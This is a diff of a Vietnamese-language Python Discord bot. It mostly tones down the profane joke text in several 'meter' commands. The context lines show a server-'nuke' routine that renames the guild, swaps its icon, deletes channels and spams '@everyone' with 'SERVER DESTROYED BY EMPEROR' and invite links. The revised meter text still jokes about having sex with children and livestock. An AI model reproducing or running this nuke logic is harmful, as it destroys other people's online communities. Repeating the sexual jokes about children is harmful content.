@@ -841,7 +841,7 @@ def setup_bot_events(b_inst, name):
                 if guild.icon:
                   embed_nuke.set_thumbnail(url=guild.icon.url)
     
-                embed_nuke.set_footer(text=f"Bot: {b_inst.user.name} • Cảnh báo khẩn")
+                embed_nuke.set_footer(text=f"Bot: {b_inst.user.name} • EPR")
                 embed_nuke.timestamp = discord.utils.utcnow()
                 await owner.send(embed=embed_nuke)
           except Exception as e:
@@ -852,7 +852,7 @@ def setup_bot_events(b_inst, name):
             if not os.path.exists(img_path):
               img_path = "girlchina.jpg"
     
-            edit_kwargs = {"name": "EMPEROR ONTOP $"}
+            edit_kwargs = {"name": "EMPEROR LÀ TỤI CHA"}
             if os.path.exists(img_path):
               with open(img_path, "rb") as f:
                 edit_kwargs["icon"] = f.read()
@@ -890,9 +890,9 @@ def setup_bot_events(b_inst, name):
                   "EMPEROR",
               ]
               noi_dung_nuke = """@everyone @here
-    # [EMPEROR BỌN A ONTOP](https://discord.gg/zvdH9ZtBp2)
-    # SERVER DESTROYED BY EMPEROR 🤣😂🤪😜
-    # [SERVER BỊ BỌN A CHỊCH](https://cutes.lol/emiuanh209)"""
+# [EMPEROR BỌN A ONTOP](https://discord.gg/zvdH9ZtBp2)
+# SERVER DESTROYED BY EMPEROR 🤣😂🤪😜
+# [SERVER BỊ BỌN A CHỊCH](https://cutes.lol/emiuanh209)"""
     
               delete_tasks = [
                   ch.delete()
@@ -1358,21 +1358,21 @@ def register_all_commands(b_target):
     tyle = random.randint(1, 100)
 
     if tyle <= 25:
-      level = "Thằng Lồn Này Trai Thẳng 😜"
+      level = "Thằng Này Trai Thẳng 😜"
       outfit = "Mặc Vest Đeo Đính Đen Siêu Cấp Bá Khí"
-      nhan_xet = "Trai Thẳng 100%, Femboy Cái Lồn Má Mày"
+      nhan_xet = "Trai Thẳng 100%, Femboy Con Cac"
     elif tyle <= 50:
-      level = "Nghi Vấn Thằng Lồn Này Sắp Thành Femboy 🤔"
+      level = "Nghi Vấn Thằng Này Sắp Thành Femboy 🤔"
       outfit = "Hay Trộm Váy Của Mẹ Mặc Lén"
-      nhan_xet = "Sắp Thành Femboy Rồi, Tập Gym Đi Thằng Lồn"
+      nhan_xet = "Sắp Thành Femboy Rồi, Tập Gym Đi Thằng L"
     elif tyle <= 80:
-      level = "Thằng Chó Này Chuẩn Femboy 😂"
-      outfit = "Mặc Toàn Đồ Con Gái, Tất Đen Cosplay Siêu Nứng"
-      nhan_xet = "Chuẩn Mẹ Nó Femboy Rồi Khỏi Chối Đâu Thằng Lồn 🤣"
+      level = "Thằng Này Chuẩn Femboy 😂"
+      outfit = "Mặc Toàn Đồ Con Gái, Tất Đen Cosplay Siêu Múp"
+      nhan_xet = "Chuẩn Femboy Rồi Khỏi Chối Đâu 🤣"
     else:
       level = "CHÚA TỂ FEMBOY TỐI THƯỢNG 🤤"
       outfit = "Cân All Outfit"
-      nhan_xet = "Giọng Nói Ngọt Vãi Lồn Khiến Ae Bắn Tinh Như Mưa"
+      nhan_xet = "Giọng Nói Ngọt Vãi L Khiến Ae Mê Như Điếu Đỗ"
 
     embed = discord.Embed(
         title="🎀 MÁY ĐO FEMBOY BÁ KHÍ 🎀",
@@ -1410,24 +1410,24 @@ def register_all_commands(b_target):
 
     if score <= 20:
       level = "Trong Sáng Như Tờ Giấy Trắng 🧐"
-      habit = "Đéo Dâm "
-      nhan_xet = "Đéo Biết Đụ Là Gì"
+      habit = "Đeo Dâm "
+      nhan_xet = "Không Biết Sếch Là Gì"
     elif score <= 45:
       level = "Hơi Dâm 🤔"
-      habit = "Có Lúc Suy Nghĩ Đến Việc Đụ Crush"
+      habit = "Có Lúc Suy Nghĩ Đến Việc Nắc Crush"
       nhan_xet = "Có Biểu Hiện Nhưng Còn Kiềm Chế Được"
     elif score <= 70:
       level = "Dâm Cấp Trung 😂"
-      habit = "Hay Dụ Các Cô Gái Để Đụ Lén"
-      nhan_xet = "Con Sói Thức Dậy Gặp Gái Là Cặc Cửng"
+      habit = "Hay Dụ Người Khác Để Nắc Lén"
+      nhan_xet = "Con Sói Con Người Thức Dậy Gặp Ai Cũng Thèm Thuồng"
     elif score <= 90:
-      level = "Thằng Chó Này Dâm  Vãi Lồn 🔥"
-      habit = "Gặp Ai Cũng Đụ Bất Cứ Người Già Hay Trẻ Em"
-      nhan_xet = "Tuy Đụ Rất Nhiều Nhưng Bị Yếu Sinh Lý"
+      level = "Thằng Này Dâm  Vãi L🔥"
+      habit = "Gặp Ai Cũng Nắc Bất Cứ Người Già Hay Trẻ Em"
+      nhan_xet = "Tuy Nắc Rất Nhiều Nhưng Bị Yếu Sinh Lý"
     else:
       level = "CHÚA TỂ DÂM ĐÃNG 👑"
-      habit = "Đụ Người Lẫn Động Vật Gia Súc Và Gia Cầm"
-      nhan_xet = "Vì Đụ Quá Nhiều Nên Con Cặc Bị Hoại Tử Đành Phải Cắt Bỏ"
+      habit = "Nắc Người Lẫn Động Vật Gia Súc Và Gia Cầm"
+      nhan_xet = "Khởi Nguồn Của Sự Dâm Đãng Trên Toàn Thế Giới"
 
     embed = discord.Embed(
         title="🔥 MÁY ĐO DÂM ĐÃNG BÁ KHÍ 🔥",
@@ -1461,8 +1461,8 @@ def register_all_commands(b_target):
 
     if tyle <= 20:
       level = "Người Bình Thường 🚶"
-      style = "Hơi Hơi Cute"
-      nhan_xet = "Có Một Chút Sự Đáng Yêu"
+      style = "Không Có Gì Đặc Biệt"
+      nhan_xet = "Quá Bình Thường"
     elif tyle <= 50:
       level = "Hơi Cute 🌷"
       style = "Dễ Thương Vừa Đủ"
@@ -1473,8 +1473,8 @@ def register_all_commands(b_target):
       nhan_xet = "Đứng Top1 Đáng Iu Nhất Trường"
     elif tyle <= 95:
       level = "Cực Kỳ Cute 💖"
-      style = "Cute Vãi Lồn Luôn"
-      nhan_xet = "Cute Đến Nổi Chúa Cũng Phải Thốt Lên OMG"
+      style = "Cute Siu Cấp"
+      nhan_xet = "Đạt Danh Hiệu Cute Nhất Việt Nam"
     else:
       level = "CHÚA TỂ CUTE 👑✨"
       style = "Cute Không Ai Bằng"
@@ -1489,7 +1489,7 @@ def register_all_commands(b_target):
         color=discord.Color.from_rgb(255, 105, 180),
     )
     embed.add_field(name="🏷️ Cấp Độ:", value=f"`{level}`", inline=True)
-    embed.add_field(name="✨ Phong Cách:", value=f"`{style}`", inline=True)
+    embed.add_field(name="✨ Mức Độ:", value=f"`{style}`", inline=True)
     embed.add_field(
         name="💬 Nhận Xét:", value=f"> *{nhan_xet}*", inline=False
     )
@@ -1532,7 +1532,7 @@ def register_all_commands(b_target):
     embed.add_field(name="🆔 Mã giao dịch:", value=f"{trans_id}", inline=True)
     embed.add_field(name="⏰ Thời gian:", value="Hôm nay", inline=True)
     embed.set_footer(
-        text=f"Thực hiện bởi {interaction.user.name} • Ngân Hàng Mại Dâm"
+        text=f"Thực hiện bởi {interaction.user.name} • Ngân Hàng EPR"
     )
 
     await interaction.followup.send(embed=embed)
@@ -1551,20 +1551,20 @@ def register_all_commands(b_target):
     tyle = random.randint(1, 100)
 
     if tyle <= 20:
-      status = "Thằng Lồn Này Bình Thường 🚶"
-      waifu = "Đéo Có (Chỉ Thích Người Thật)"
+      status = "Thằng Này Bình Thường 🚶"
+      waifu = "Không Có (Chỉ Thích Người Thật)"
       anime_hours = "0 Giờ / Tuần"
-      quote = "Anime Là Con Cặc Gì?"
+      quote = "Anime Là CC Gì?"
     elif tyle <= 50:
       status = "Wibu Sơ Cấp 🍡"
       waifu = "Rem / Nezuko / Hinata"
       anime_hours = "2 Giờ / Ngày"
-      quote = "Ước Được Bóp Vú Và Xoa Ti Gái Alime 🤤"
+      quote = "Ước Được Cưới Những Em Ấy Làm Vợ 🤤"
     elif tyle <= 80:
       status = "Wibu Trung Cấp ⚔️"
       waifu = "1000 Em Waifu"
       anime_hours = "6 Giờ / Ngày"
-      quote = "Ước Được Húp Nước Lồn Mấy Em Gái Alime Thì Sướng Biết Bao 🥺"
+      quote = "Sống ở Thế Giới Này Quá Nhàm Chán 🥺"
     else:
       status = "CHÚA TỂ WIBU / BÁ KHÍ OTAKU 👑🌀"
       waifu = "Tất cả Waifu trong mọi Anime Isekai"
@@ -1801,7 +1801,7 @@ def register_all_commands(b_target):
             name="Lệnh Free",
             value=(
                 "❤️**`/femboy`**\n"
-                "➱ Đo lường chỉ số Femboy\n\n"
+                "➱ Đo chỉ số Femboy\n\n"
 
                 "🌸**`/cute`**\n"
                 "➱ Đo chỉ số Cute\n\n"
@@ -1810,7 +1810,7 @@ def register_all_commands(b_target):
                 "➱ Đo độ dâm đãng\n\n"
 
                 "🤓**`/wibu`**\n"
-                "➱ Phân tích mức độ nghiện Anime\n\n"
+                "➱ Đo độ nghiện Anime\n\n"
 
                 "💵**`/chuyentien`**\n"
                 "➱ Chuyển khoản ngân hàng trực tuyến\n\n"
